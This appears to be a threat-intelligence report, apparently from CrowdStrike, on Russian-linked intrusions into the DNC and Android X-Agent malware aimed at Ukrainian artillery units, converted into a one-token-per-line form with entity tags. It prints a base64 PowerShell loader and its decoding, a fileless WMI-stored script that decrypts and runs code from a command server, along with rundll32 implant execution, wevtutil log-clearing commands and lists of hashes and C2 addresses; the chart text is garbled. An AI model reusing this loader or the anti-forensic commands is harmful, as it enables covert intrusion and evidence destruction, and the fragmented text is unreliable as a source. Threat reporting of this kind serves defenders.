ZgB1AG4AYwB0AGkAbwBuACAAcABlAHIAZgBDAHIAKAAkAGMAcgBUAHIALAAgACQAZABhAHQAYQApAA0ACgB7AA0ACgAJACQAcgBlAHQAIAA9ACAAJABuAHUAbABsAA0ACgAJAHQAcgB5AHsADQAKAAkACQAkAG0AcwAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBNAGUAbQBvAHIAeQBTAHQAcgBlAGEAbQANAAoACQAJACQAYwBzACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAFMAZQBjAHUAcgBpAHQAeQAuAEMAcgB5AHAAdABvAGcAcgBhAHAAaAB5AC4AQwByAHkAcAB0AG8AUwB0AHIAZQBhAG0AIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAQAAoACQAbQBzACwAIAAkAGMAcgBUAHIALAAgAFsAUwB5AHMAdABlAG0ALgBTAGUAYwB1AHIAaQB0AHkALgBDAHIAeQBwAHQAbwBnAHIAYQBwAGgAeQAuAEMAcgB5AHAAdABvAFMAdAByAGUAYQBtAE0AbwBkAGUAXQA6ADoAVwByAGkAdABlACkADQAKAAkACQAkAGMAcwAuAFcAcgBpAHQAZQAoACQAZABhAHQAYQAsACAAMAAsACAAJABkAGEAdABhAC4ATABlAG4AZwB0AGgAKQANAAoACQAJACQAYwBzAC4ARgBsAHUAcwBoAEYAaQBuAGEAbABCAGwAbwBjAGsAKAApAA0ACgAJAAkAJAByAGUAdAAgAD0AIAAkAG0AcwAuAFQAbwBBAHIAcgBhAHkAKAApAA0ACgAJAAkAJABjAHMALgBDAGwAbwBzAGUAKAApAA0ACgAJAAkAJABtAHMALgBDAGwAbwBzAGUAKAApAA0ACgAJAH0ADQAKAAkAYwBhAHQAYwBoAHsAfQANAAoACQByAGUAdAB1AHIAbgAgACQAcgBlAHQADQAKAH0ADQAKAA0ACgBmAHUAbgBjAHQAaQBvAG4AIABkAGUAYwByAEEAZQBzACgAJABlAG4AYwBEAGEAdABhACwAIAAkAGsAZQB5ACwAIAAkAGkAdgApAA0ACgB7AA0ACgAJACQAcgBlAHQAIAA9ACAAJABuAHUAbABsAA0ACgAJAHQAcgB5AHsADQAKAAkACQAkAHAAcgBvAHYAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4AUwBlAGMAdQByAGkAdAB5AC4AQwByAHkAcAB0AG8AZwByAGEAcABoAHkALgBSAGkAagBuAGQAYQBlAGwATQBhAG4AYQBnAGUAZAANAAoACQAJACQAcAByAG8AdgAuAEsAZQB5ACAAPQAgACQAawBlAHkADQAKAAkACQAkAHAAcgBvAHYALgBJAFYAIAA9ACAAJABpAHYADQAKAAkACQAkAGQAZQBjAHIAIAA9ACAAJABwAHIAbwB2AC4AQwByAGUAYQB0AGUARABlAGMAcgB5AHAAdABvAHIAKAAkAHAAcgBvAHYALgBLAGUAeQAsACAAJABwAHIAbwB2AC4ASQBWACkADQAKAAkACQAkAHIAZQB0ACAAPQAgAHAAZQByAGYAQwByACAAJABkAGUAYwByACAAJABlAG4AYwBEAGEAdABhAA0ACgAJAH0ADQAKAAkAYwBhAHQAYwBoAHsAfQANAAoACQByAGUAdAB1AHIAbgAgACQAcgBlAHQADQAKAH0ADQAKAA0ACgBmAHUAbgBjAHQAaQBvAG4AIABzAFcAUAAoACQAYwBOACwAIAAkAHAATgAsACAAJABhAEsALAAgACQAYQBJACkADQAKAHsADQAKAAkAaQBmACgAJABjAE4AIAAtAGUAcQAgACQAbgB1AGwAbAAgAC0AbwByACAAJABwAE4AIAAtAGUAcQAgACQAbgB1AGwAbAApAHsAcgBlAHQAdQByAG4AIAAkAGYAYQBsAHMAZQB9AA0ACgAJAHQAcgB5AHsADQAKAAkACQAkAHcAcAAgAD0AIAAoAFsAdwBtAGkAYwBsAGEAcwBzAF0AJABjAE4AKQAuAFAAcgBvAHAAZQByAHQAaQBlAHMAWwAkAHAATgBdAC4AVgBhAGwAdQBlAA0ACgAJAAkAJABlAHgARQBuACAAPQAgAFsAQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJAB3AHAAKQANAAoACQAJACQAZQB4AEQAZQBjACAAPQAgAGQAZQBjAHIAQQBlAHMAIAAkAGUAeABFAG4AIAAkAGEASwAgACQAYQBJAA0ACgAJAAkAJABlAHgAIAA9ACAAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAZQB4AEQAZQBjACkADQAKAAkACQBpAGYAKAAkAGUAeAAgAC0AZQBxACAAJABuAHUAbABsACAALQBvAHIAIAAkAGUAeAAgAC0AZQBxACAAJwAnACkADQAKAAkACQB7AHIAZQB0AHUAcgBuAH0ADQAKAAkACQBJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAkAGUAeAANAAoACQAJAHIAZQB0AHUAcgBuACAAJAB0AHIAdQBlAA0ACgAJAH0ADQAKAAkAYwBhAHQAYwBoAHsADQAKAAkACQByAGUAdAB1AHIAbgAgACQAZgBhAGwAcwBlAA0ACgAJAH0ADQAKAH0ADQAKAA0ACgAkAGEAZQBLACAAPQAgAFsAYgB5AHQAZQBbAF0AXQAgACgAMAB4AGUANwAsACAAMAB4AGQANgAsACAAMAB4AGIAZQAsACAAMAB4AGEAOQAsACAAMAB4AGIANwAsACAAMAB4AGUANgAsACAAMAB4ADUANQAsACAAMAB4ADMAYQAsACAAMAB4AGUAZQAsACAAMAB4ADEANgAsACAAMAB4ADcAOQAsACAAMAB4AGMAYQAsACAAMAB4ADUANgAsACAAMAB4ADAAZgAsACAAMAB4AGIAYwAsACAAMAB4ADMAZgAsACAAMAB4ADIAMgAsACAAMAB4AGUAZAAsACAAMAB4AGYAZgAsACAAMAB4ADAAMgAsACAAMAB4ADQAMwAsACAAMAB4ADQAYwAsACAAMAB4ADEAYgAsACAAMAB4AGMAMAAsACAAMAB4AGUANwAsACAAMAB4ADUANwAsACAAMAB4AGIAMgAsACAAMAB4AGMAYgAsACAAMAB4AGQAOAAsACAAMAB4AGMAZQAsACAAMAB4AGQAYQAsACAAMAB4ADAAMAApAA0ACgAkAGEAZQBJACAAPQAgAFsAYgB5AHQAZQBbAF0AXQAgACgAMAB4AGIAZQAsACAAMAB4ADcAYQAsACAAMAB4ADkAMAAsACAAMAB4AGQAOQAsACAAMAB4AGQANQAsACAAMAB4AGYANwAsACAAMAB4AGEAYQAsACAAMAB4ADYAZAAsACAAMAB4AGUAOQAsACAAMAB4ADEANgAsACAAMAB4ADYANAAsACAAMAB4ADEAZAAsACAAMAB4ADkANwAsACAAMAB4ADEANgAsACAAMAB4AGMAMAAsACAAMAB4ADYANwApAA0ACgBzAFcAUAAgACcAVwBtAGkAJwAgACcAVwBtAGkAJwAgACQAYQBlAEsAIAAkAGEAZQBJACAAfAAgAE8AdQB0AC0ATgB1AGwAbAA=
This
decodes
to
:
function
perfCr
(
$
crTr
,
$
data
)
{
$
ret
=
$
null
try
{
$
ms
=
New-Object
System.IO.MemoryStream
$
cs
=
New-Object
System.Security.Cryptography.CryptoStream
-ArgumentList
@
(
$
ms
,
$
crTr
,
[
System.Security.Cryptography.CryptoStreamMode]::Write
)
$
cs.Write($data
,
0
,
$
data.Length
)
$
cs.FlushFinalBlock
(
)
$
ret
=
$
ms.ToArray
(
)
$
cs.Close
(
)
$
ms.Close
(
)
}
catch
{
}
return
$
ret
}
function
decrAes
(
$
encData
,
$
key
,
$
iv
)
{
$
ret
=
$
null
try
{
$
prov
=
New-Object
System.Security.Cryptography.RijndaelManaged
$
prov.Key
=
$
key
$
prov.IV
=
$
iv
$
decr
=
$
prov.CreateDecryptor($prov.Key
,
$
prov.IV
)
$
ret
=
perfCr
$
decr
$
encData
}
Catch
{
}
return
$
ret
}
function
sWP
(
$
cN
,
$
pN
,
$
aK
,
$
aI
)
{
if
(
$
cN
-eq
$
null
-or
$
pN
-eq
$
null
)
{
return
$
false
}
try
{
$
wp
=
(
[
wmiclass]$cN).Properties[$pN].Value
$
exEn
=
[
Convert
]
:
:FromBase64String
(
$
wp
)
$
exDec
=
decrAes
$
exEn
$
aK
$
aI
$
ex
=
[
Text.Encoding]::UTF8.GetString($exDec
)
if
(
$
ex
-eq
$
null
-or
$
ex
-eq
'
)
{
return
}
Invoke-Expression
$
ex
return
$
true
}
catch
{
return
$
false
}
}
$
aeK
=
[
byte
[
]
]
(
0xe7
,
0xd6
,
0xbe
,
0xa9
,
0xb7
,
0xe6
,
0x55
,
0x3a
,
0xee
,
0x16
,
0x79
,
0xca
,
0x56
,
0x0f
,
0xbc
,
0x3f
,
0x22
,
0xed
,
0xff
,
0x02
,
0x43
,
0x4c
,
0x1b
,
0xc0
,
0xe7
,
0x57
,
0xb2
,
0xcb
,
0xd8
,
0xce
,
0xda
,
0x00
)
$
aeI
=
[
byte
[
]
]
(
0xbe
,
0x7a
,
0x90
,
0xd9
,
0xd5
,
0xf7
,
0xaa
,
0x6d
,
0xe9
,
0x16
,
0x64
,
0x1d
,
0x97
,
0x16
,
0xc0
,
0x67
)
sWP
'Wmi
'
'Wmi
'
$
aeK
$
aeI
|
Out-Null
This
one-line
powershell
command
,
stored
only
in
WMI
database
,
establishes
an
encrypted
connection
to
C2
and
downloads
additional
powershell
modules
from
it
,
executing
them
in
memory
.

In
theory
,
the
additional
modules
can
do
virtually
anything
on
the
victim
system
.

The
encryption
keys
in
the
script
were
different
on
every
system
.

Powershell
version
of
credential
theft
tool
MimiKatz B_malware.infosteal
was
also
used
by
the
actors
to
facilitate
credential
acquisition
for
lateral
movement
purposes
.

FANCY
BEAR
adversary
used
different
tradecraft
,
deploying
X-Agent B_malware.infosteal
malware
with
capabilities
to
do
remote
command
execution
,
file
transmission
and
keylogging
.

It
was
executed
via
rundll32
commands
such
as
:
rundll32.exe
'C:\Windows\twain_64.dll
'
In
addition
,
FANCY
BEAR
's
X-Tunnel B_malware.unknown
network
tunneling
tool
,
which
facilitates
connections
to
NAT-ed
environments
,
was
used
to
also
execute
remote
commands
.

Both
tools
were
deployed
via
RemCOM B_malware.backdoor
,
an
open-source
replacement
for
PsExec B_malware.backdoor
available
from
GitHub
.

They
also
engaged
in
a
number
of
anti-forensic
analysis
measures
,
such
as
periodic
event
log
clearing
(
via
wevtutil
cl
System
and
wevtutil
cl
Securitycommands
)
and
resetting
timestamps
of
files
.

Intelligence
collection
directed
by
nation
state
actors
against
US
political
targets
provides
invaluable
insight
into
the
requirements
directed
upon
those
actors
.

Regardless
of
the
agency
or
unit
tasked
with
this
collection
,
the
upcoming
US
election
,
and
the
associated
candidates
and
parties
are
of
critical
interest
to
both
hostile
and
friendly
nation
states
.

The
2016
presidential
election
has
the
world
's
attention
,
and
leaders
of
other
states
are
anxiously
watching
and
planning
for
possible
outcomes
.

Attacks
against
electoral
candidates
and
the
parties
they
represent
are
likely
to
continue
up
until
the
election
in
November
.

Indicators
of
Compromise
:
IOC
Adversary
IOC
Type
Additional
Info
6c1bce76f4d2358656132b6b1d471571820688ccdbaca0d86d0ca082b9390536 B_hash
COZY
BEAR
SHA256
pagemgr.exe
(
SeaDaddy B_malware.backdoor
implant
)
b101cd29e18a515753409ae86ce68a4cedbe0d640d385eb24b9bbb69cf8186ae B_hash
COZY
BEAR
SHA256
pagemgr.exe
185[.]100[.]84[.]134:443 B_ip.cncsvr
COZY
BEAR
C2
SeaDaddy B_malware.backdoor
implant
C2
(
SeaDaddy B_malware.backdoor
implant
)
2/3
58[.]49[.]58[.]58:443 B_ip.cncsvr
218[.]1[.]98[.]203:80 B_ip.cncsvr
187[.]33[.]33[.]8:80 B_ip.cncsvr
COZY
BEAR
COZY
BEAR
COZY
BEAR
C2
C2
C2
SeaDaddy B_malware.backdoor
implant
C2
Powershell
implant
C2
Powershell
implant
C2
fd39d2837b30e7233bc54598ff51bdc2f8c418fa5b94dea2cadb24cf40f395e5 B_hash
FANCY
BEAR
SHA256
twain_64.dll
(
64-bit
X-Agent B_malware.infosteal
implant
)
4845761c9bed0563d0aa83613311191e075a9b58861e80392914d61a21bad976 B_hash
FANCY
BEAR
SHA256
VmUpgradeHelper.exe
(
X-Tunnel B_malware.unknown
implant
)
40ae43b7d6c413becc92b07076fa128b875c8dbb4da7c036639eccf5a9fc784f B_hash
FANCY
BEAR
SHA256
VmUpgradeHelper.exe
185[.]86[.]148[.]227:443 B_ip.cncsvr
45[.]32[.]129[.]185:443 B_ip.cncsvr
23[.]227[.]196[.]217:443 B_ip.cncsvr
(
X-Tunnel B_malware.unknown
implant
)
FANCY
BEAR
C2
X-Agent B_malware.infosteal
implant
C2
FANCY
BEAR
C2
X-Tunnel B_malware.unknown
implant
C2
FANCY
BEAR
C2
X-Tunnel B_malware.unknown
implant
C2
3/3
USE
OF
FANCY
BEAR
ANDROID
MALWARE
IN
TRACKING
OF
UKRAINIAN
FIELD
ARTILLERY
UNITS
PUBLISHEDDECEMBER22
CROWDSTRIKE
GLOBAL
INTELLIGENCE
TEAM
web
:
WWW.CROWDSTRIKE.COM B_url.normal
|
twitter
:
@
CROWDSTRIKE
Copyright
2016
KEY
POINTS
•
From
late
2014
and
through
2016
,
FANCY
BEAR
X-Agent B_malware.infosteal
implant
was
covertly
distributed
on
Ukrainian
military
forums
within
a
legitimate
Android
application
developed
by
Ukrainian
artillery
officer
Yaroslav
Sherstuk
.

•
The
original
application
enabled
artillery
forces
to
more
rapidly
process
targeting
data
for
the
Soviet-era
D-30
Howitzer
employed
by
Ukrainian
artillery
forces
reducing
targeting
time
from
minutes
to
under
15
seconds
.

According
to
Sherstuk
's
interviews
with
the
press
,
over
9000
artillery
personnel
have
been
using
the
application
in
Ukrainian
military
.

•
Successful
deployment
of
the
FANCY
BEAR
malware
within
this
application
may
have
facilitated
reconnaissance
against
Ukrainian
troops
.

The
ability
of
this
malware
to
retrieve
communications
and
gross
locational
data
from
an
infected
device
makes
it
an
attractive
way
to
identify
the
general
location
of
Ukrainian
artillery
forces
and
engage
them
.

•
Open
source
reporting
indicates
that
Ukrainian
artillery
forces
have
lost
over
50
%
of
their
weapons
in
the
2
years
of
conflict
and
over
80
%
of
D-30
howitzers
,
the
highest
percentage
of
loss
of
any
other
artillery
pieces
in
Ukraine
's
arsenal
.

•
This
previously
unseen
variant
of
X-Agent B_malware.infosteal
represents
FANCY
BEAR
's
expansion
in
mobile
malware
development
from
iOS-capable
implants
to
Android
devices
,
and
reveals
one
more
component
of
the
broad
spectrum
approach
to
cyber
operations
taken
by
Russia-based
actors
in
the
war
in
Ukraine
.

•
The
collection
of
such
tactical
artillery
force
positioning
intelligence
by
FANCY
BEAR
further
supports
CrowdStrike
's
previous
assessments
that
FANCY
BEAR
is
likely
affiliated
with
the
Russian
military
intelligence
(
GRU
)
,
and
works
closely
with
Russian
military
forces
operating
in
Eastern
Ukraine
and
its
border
regions
in
Russia
.
'

OPEN-SOURCE
REPORTING
INDICATES
LOSSES
OF
ALMOST
50
%
OF
EQUIPMENT
IN
THE
LAST
2
YEARS
OF
CONFLICT
AMONGST
UKRAINIAN
ARTILLERY
FORCES
AND
OVER
80
%
OF
D-30
HOWITZERS
WERE
LOST
,
FAR
MORE
THAN
ANY
OTHER
PIECE
OF
UKRAINIAN
ARTILLERY
9
.
'

BACKGROUND
In
late
June
and
August
2016
,
CrowdStrike
Intelligence
provided
initial
reporting
and
technical
analysis
of
a
variant
of
the
FANCY
BEAR
implant
X-Agent B_malware.infosteal
that
targeted
the
Android
mobile
platform2
.

CrowdStrike
identified
this
X-Agent B_malware.infosteal
variant
within
a
legitimate
Android
application
named
Попр-Д30.apk B_malware.backdoor
.

This
app
was
developed
and
used
by
artillery
troops
to
simplify
targeting
data
for
the
D-30
towed
howitzer
.

CrowdStrike
investigation
reveals
that
this
app
has
been
utilized
in
a
possible
training
or
operational
role
in
at
least
one
unit
of
the
Ukrainian
military
.

Therefore
,
the
implant
likely
targeted
military
artillery
units
operating
against
pro-Russian
separatists
in
Eastern
Ukraine
.

This
implant
represents
further
advancements
in
FANCY
BEAR
's
development
of
mobile
malware
for
targeted
intrusions
and
extends
Russian
cyber
capabilities
to
the
front
lines
of
the
battlefield
.

This
Tipper
builds
on
CrowdStrike
's
previous
reporting
by
providing
a
timeline
of
events
,
contextual
discussion
regarding
the
potential
drivers
for
development
and
deployment
of
the
malware
,
and
a
description
of
the
analytical
process
resulting
in
targeting
assessments
.

Finally
,
this
Tipper
leverages
these
assessments
,
in
conjunction
with
more
recently
observed
activity
by
Russia-based
adversaries
,
to
determine
the
potential
for
any
future
activity
in
the
mobile
malware
threat
space
.
'

CROWDSTRIKE
IDENTIFIED
THIS
X-Agent B_malware.infosteal
VARIANT
WITHIN
A
LEGITIMATE
ANDROID
APPLICATION
NAMED
Попр-Д30.apk B_malware.backdoor
.

THIS
APP
WAS
DEVELOPED
AND
USED
BY
ARTILLERY
TROOPS
TO
SIMPLIFY
TARGETING
DATA
FOR
THE
D-30
TOWED
HOWITZER
'
Individual
believed
to
be
the
developer
promotes
Android
App
on
Russian
Social
Media
Site
vKontakte
Kremlin
threatens
Ukraine
over
EU
agreement
Anon
Ops
vs
.

Ukraine
Gov't
Websites
-
Defacements
and
DDoS
Russia
offers
Ukraine
loans
and
discounts
on
gas
Gazprom
increases
gas
prices
,
Ukraine
skips
payment
Intrusions
into
Ukraine
's
Transportation
Sector
DDoS
and
targeted
intrusions
in
media
,
financial
,
&
political
entities
in
Ukraine
ПОПР
-
Д30DEVELOPED20FEB
-
13APR
Referendum
on
Crimea
/
Crimean
annexation
Presidential
Elections
in
Ukraine
Malicious
App
Observed
in
Distribution
on
Forums
JAN
FEB
MAR
APR
MAY
JUNE
JULY
AUG
SEPT
OCT
NOV
DEC
JAN
FEB
MAR
APR
MAY
JUNE
JULY
AUG
SEPT
OCT
NOV
DEC
LIKELY
RUSSIA-BASED
RECONNAISSANCE
OF
UKRAINIAN
GOVERNMENT
AND/OR
MILITARY
TARGETS
POSSIBLE
DEVELOPMENT
TIME
FRAME
:
MALICIOUS
X-Agent B_malware.infosteal
IMPLANT
INJECT
FOR
ПОПР-Д30
LATE
APRIL
2013
-
EARLY
DECEMBER
2014
MALICIOUS
APP
DISTRIBUTION
20132014
Ukraine
's
Parliament
UKR
Pres
.

convenes
and
plans
to
lay
Yanukovych
does
foundation
for
EU
about
face
on
Association
Agreement
planned
EU
agreement
,
orients
towards
Russia
Protest
movement
begins
in
Kiev
Protests
reach
their
peak
,
gov't
cracks
down
violently
;
agreement
reached
for
elections
;
Yanukovich
flees
to
Russia
DDoS
vs
.

NATO
Armed
men
appear
in
unmarked
uniforms
in
Crimea
CyberBerkut
Emerges
ARMED
CONFLICT
IN
UKRAINE
Malaysia
Air
Flight
MH17
destroyed
by
pro-Russian
Separatists
Minsk
I
Ceasefire
Signed
Video
depicting
use
of
Попр-Д30
application
in
eastern
Ukraine
Pro-Russian
forces
begin
seizing
government
resources
in
Eastern
Ukraine
Earliest
public
reporting
on
the
Android
App
developed
by
the
Ukrainian
soldier
Intrusion
against
Ukraine
's
Central
Election
Commission
LEGEND
Events
associated
with
the
Android
app
International
Events
or
Diplomacy
Efforts
Ukrainian
Domestic
Affairs
Targeted
Intrusion
,
DDoS
or
Disinformation
Russian
/
Ukrainian
Confrontation
CyberBerkut
Releases
Info
Associated
With
Claimed
Intrusion
into
Ukraine
's
Security
Service
SBU
CyberBerkut
Defaces
Bellingcat
Website
Cyber
attacks
against
Ukrainian
power
stations
Attack
on
Kiev
Airport
System
JAN
FEB
MAR
APR
MAY
JUNE
JULY
AUG
SEPT
OCT
NOV
DEC
JAN
FEB
MAR
APR
MAY
JUNE
JULY
AUG
SEPT
OCT
NOV
DEC
LIKELY
RUSSIA-BASED
RECONNAISSANCE
OF
UKRAINIAN
GOVERNMENT
AND
/
OR
MILITARY
TARGETS
MALICIOUS
APP
DEVELOPMENT
,
DEPLOYMENT
,
AND
USAGE
TIME
FRAME
LATE
APRIL
2013
-
AND
BEYOND
20152016
First
Minsk
Ceasefire
Minsk
II
Protocol
Collapses
signed
Targeted
intrusions
against
Ukraine
's
Ministry
of
Defense
Developer
of
benign
app
promoted
within
Ukrainian
military
Pro-Russian
Hacktivist
Group
Sprut
Emerges
Reported
testing
period
for
ArtOS
ARMED
CONFLICT
IN
UKRAINE
LEGEND
Events
associated
with
the
Android
app
International
Events
or
Diplomacy
Efforts
Ukrainian
Domestic
Affairs
Targeted
Intrusion
,
DDoS
or
Disinformation
Russian
/
Ukrainian
Confrontation
Crimea
lacks
electricity
after
physical
attack
News
story
associating
app
author
as
head
of
the
ArtOS
project
,
a
joint
endeavor
with
the
Noosphere
Engineering
School
Forums
discussing
the
app
and
claiming
to
be
associated
with
the
developers
users
are
called
out
as
fraudulent
some
users
claim
copy
apps
are
distributing
malware
TIMELINE
OF
EVENTS
DEVELOPMENT
AND
DISTRIBUTION
PROCESS
OF
THE
BENIGN
APPLICATION
The
original
application
central
to
this
discussion
,
Попр-Д30.apk B_malware.backdoor
,
was
initially
developed
domestically
within
Ukraine
by
a
member
of
the
55th
Artillery
Brigade
.

Based
on
the
file
creation
timestamps
as
well
as
the
app
signing
process
,
which
occurred
on
28
March
2013
,
CrowdStrike
has
determined
that
the
app
was
developed
sometime
between
20
February
and
13
April
2013
.

Shortly
after
that
time
frame
,
on
28
April
2013
,
an
individual
bearing
the
same
name
as
the
application
's
developer
promoted
the
application
on
Russian
vKontakte3
pages
associated
with
the
artillery
forces
.

The
promotion
of
the
program
was
likely
limited
to
social
media
,
and
the
distribution
was
controlled
from
the
author
's
main
page
,
'
Програмное
обеспечение
современного
боя
'
(
translation
:
'
Modern
combat
software
'
)
.
4
As
an
additional
control
measure
,
the
program
was
only
activated
for
use
after
the
developer
was
contacted
and
issued
a
code
to
the
individual
downloading
the
application
.

No
evidence
of
the
application
has
been
observed
on
the
Android
app
store
,
making
it
unlikely
that
the
app
was
distributed
via
that
platform
.

The
control
measures
established
by
the
developer
to
limit
the
use
and
proliferation
of
the
Попр-Д30.apk B_malware.backdoor
application
,
coupled
with
its
unique
purpose
,
make
its
broad
distribution
on
the
Android
store
improbable
.

At
the
time
of
this
writing
,
it
is
unclear
to
what
degree
and
for
how
long
this
specific
application
was
utilized
by
the
entirety
of
the
Ukrainian
Artillery
Forces
.

Based
on
open
source
reporting
,
social
media
posts
,
and
video
evidence
,
CrowdStrike
assesses
that
Попр-Д30.apk B_malware.backdoor
was
potentially
used
through
2016
by
at
least
one
artillery
unit
operating
in
eastern
Ukraine
.

RECONNAISSANCE
,
DEVELOPMENT
AND
DISTRIBUTION
OF
THE
MALICIOUS
APPLICATION
RECONNAISSANCE
Given
the
estimated
development
timeframe
and
the
promotional
period
for
the
benign
Попр-Д30.apk B_malware.backdoor
application
,
the
program
was
likely
available
online
for
distribution
after
late
April
2013
.

CrowdStrike
Intelligence
assesses
that
the
application
likely
came
to
the
attention
of
Russia-based
adversaries
around
this
time
frame
as
a
result
of
ongoing
Russian
'
THE
ORIGINAL
,
BENIGN
APPLICATION
ENABLED
ARTILLERY
FORCES
TO
MORE
RAPIDLY
PROCESS
TARGETING
DATA
FOR
THE
D-30
HOWITZER
REDUCING
TARGETING
TIME
FROM
MINUTES
DOWN
TO
15
SECONDS
.
'

reconnaissance
associated
with
the
revolution
in
Ukraine
.

Actors
with
a
nexus
to
Russia
regularly
monitor
social
media
sites
in
order
to
better
understand
or
formulate
operations
against
their
targets
.

CrowdStrike
Intelligence
has
noted
instances
in
which
some
Russia-based
actors
and
attribution
front
groups
have
leveraged
information
obtained
from
Ukrainian
social
media
sites
in
order
to
perform
operations
.

The
most
notable
recent
example
of
this
was
in
the
case
of
extortion-based
threats
directed
against
the
Polish
Government.5
In
this
particular
case
,
the
perpetrators
likely
sought
out
openly
available
account
information
from
a
vKontakte
page
belonging
to
a
Ukrainian
citizen
,
who
was
soliciting
donations
to
aid
volunteer
soldiers
fighting
in
eastern
Ukraine
.

The
adversary
then
used
this
profile
information
,
in
conjunction
with
the
name
'
Pravyy
Sector
,
'
to
make
it
appear
as
though
the
extortion
threats
against
the
Polish
government
were
originating
from
an
ultranationalist
Ukrainian
group
.

CrowdStrike
has
assessed
that
by
performing
this
type
of
deceptive
operation
the
perpetrator
likely
sought
to
make
it
appear
as
though
Ukrainian
interests
were
threatening
the
Polish
government
.

In
addition
,
because
the
individual
account
hijacked
for
this
operation
had
been
used
to
try
to
raise
funds
for
Ukrainian
forces
,
the
adversary
may
have
been
trying
to
aggravate
Western
governments
enough
to
freeze
the
individual
's
accounts
.

The
attack
did
not
appear
to
achieve
its
intended
result
.

Poland
rebuffed
the
threats
,
and
the
owner
of
the
vKontakte
page
denounced
any
involvement
in
the
threat
.

Subsequently
the
Pravyy
Sector
group
scrubbed
their
social
media
page
of
much
of
the
information
associated
with
this
failed
operation
.

This
particular
incident
is
an
example
of
how
a
disinformation
operation
is
staged
.

While
this
incident
is
not
likely
to
be
related
to
the
development
of
the
X-Agent B_malware.infosteal
Android
variant
,
it
demonstrates
the
reconnaissance
and
preplanning
tactics
that
precede
the
rest
of
a
campaign
.

Development
and
Distribution
CrowdStrike
has
discovered
indications
that
as
early
as
2015
FANCY
BEAR
likely
developed
X-Agent B_malware.infosteal
applications
for
the
iOS
environment
,
targeting
'
jailbroken
'
Apple
mobile
devices
.

The
use
of
the
X-Agent B_malware.infosteal
implant
in
the
original
Попр-Д30.apk B_malware.backdoor
application
appears
to
be
the
first
observed
case
of
FANCY
BEAR
malware
developed
for
the
Android
mobile
platform
.

On
21
December
2014
the
malicious
variant
of
the
Android
application
was
first
observed
in
limited
public
distribution
on
a
Russian
language
,
Ukrainian
military
forum
.

A
late
2014
public
release
would
place
the
development
timeframe
for
this
implant
sometime
between
late-April
2013
and
early
December
2014
.
'

FOR
UKRAINIAN
TROOPS
,
ARTILLERY
FORCES
HAVE
ALSO
SHOULDERED
A
HEAVY
COST
.

IN
2
YEARS
OF
CONFLICT
,
THEY
HAVE
LOST
NEARLY
50
%
OF
THEIR
ARTILLERY
PIECES
AND
OVER
80
%
OF
D-30
HOWITZERS
,
FAR
MORE
THAN
ANY
OTHER
PIECE
OF
UKRAINIAN
ARTILLERY
.
'

During
that
proposed
development
timeframe
,
a
number
of
significant
events
unfolded
between
Ukraine
,
Russia
,
and
the
international
community
.

Most
notably
,
Russian
attempts
to
influence
Ukrainian-EU
relations
resulted
in
the
large-scale
,
Maidan
protest
movement
,
eventually
resulting
in
the
ouster
of
then-president
Victor
YANUKOVYCH
,
the
invasion
and
annexation
of
the
Crimean
Peninsula
by
Russia
,
and
the
protracted
armed
conflict
in
eastern
Ukraine
.

Therefore
,
the
creation
of
an
application
that
targets
some
of
the
front
line
forces
pivotal
in
Ukrainian
defense
on
the
eastern
front
would
likely
be
a
high
priority
for
Russian
adversary
malware
developers
seeking
to
turn
the
tide
of
the
conflict
in
their
favor
.

CrowdStrike
Intelligence
has
assessed
that
the
distribution
of
the
malicious
application
targeted
the
very
artillery
units
for
which
the
benign
application
was
developed—brigades
operating
in
eastern
Ukraine
on
the
frontlines
of
the
conflict
with
Russian-backed
separatist
forces
during
the
early
stages
of
the
conflict
in
late-2014
.

This
assessment
is
based
on
a
number
of
factors
,
but
chief
among
them
is
the
likelihood
that
a
military
member
would
only
trust
and
use
an
application
designed
to
calculate
something
as
critical
as
targeting
data
if
it
was
developed
and
promoted
by
a
member
of
their
own
forces
.

The
type
of
operational
activity
described
here
suggests
an
extremely
sophisticated
understanding
of
the
target
that
only
a
skilled
adversary
would
likely
possess
.

By
late
December
2014
,
the
total
number
of
Russian
forces
in
the
region
was
approximately
10,000
troops.6
Because
the
Android
malware
could
facilitate
gross
position
information
,
its
successful
deployment
could
have
facilitated
anticipatory
awareness
of
Ukrainian
artillery
force
troop
movement
,
thus
providing
Russian
forces
with
useful
strategic
planning
information
.

Indeed
,
the
55th
Artillery
Brigade
and
similar
artillery
units
operated
frequently
against
pro-Russian
separatists
in
eastern
Ukraine
.

A
video
posted
on
18
October
20157
specifically
shows
them
employing
the
Попр-Д30.apk B_malware.backdoor
application
and
operating
in
the
vicinity
of
eastern
Ukraine
.

The
choice
of
the
Russian
language
character
set
in
the
application
further
underscores
the
targeting
of
forces
within
eastern
Ukraine
,
as
Russian
is
the
predominant
language
utilized
in
that
region
.

An
assessment
of
languages
spoken
by
region
based
on
the
most
recent
census
information
illustrates
the
permeation
of
the
Russian
language
in
that
region
and
highlights
the
value
of
providing
Russian
in
the
malicious
Попр-Д30.apk B_malware.backdoor
application
.

One
alternative
theory
regarding
the
use
of
the
Russian
language
in
the
application
could
be
that
targeting
may
have
been
directed
at
pro-Russian
'
CROWDSTRIKE
INTELLIGENCE
HAS
ASSESSED
THAT
THE
DISTRIBUTION
OF
THE
MALICIOUS
APPLICATION
TARGETED
THE
VERY
ARTILLERY
UNITS
FOR
WHICH
THE
BENIGN
APPLICATION
WAS
DEVELOPED—BRIGADES
OPERATING
IN
EASTERN
UKRAINE
ON
THE
FRONTLINES
OF
THE
CONFLICT
WITH
RUSSIAN-BACKED
SEPARATIST
FORCES
DURINGTHE
EARLY
STAGES
OF
THE
CONFLICT
IN
LATE-2014
.
'

LANGUAGESSPOKENBYREGIONWESTCENTERSOUTHEASTDONBASSURKANIAN
92.6
%
78.2
%
35.3
%
37.4
%
19.9
%
URKANIAN
&
RUSSIANEQUALLYRUSSIANOTHERUNCLEAR2.9
%
2
%
1.6
%
.9
%
16.6
%
38.4
%
34.4
%
34
%
4.2
%
.4
%
.6
%
20
%
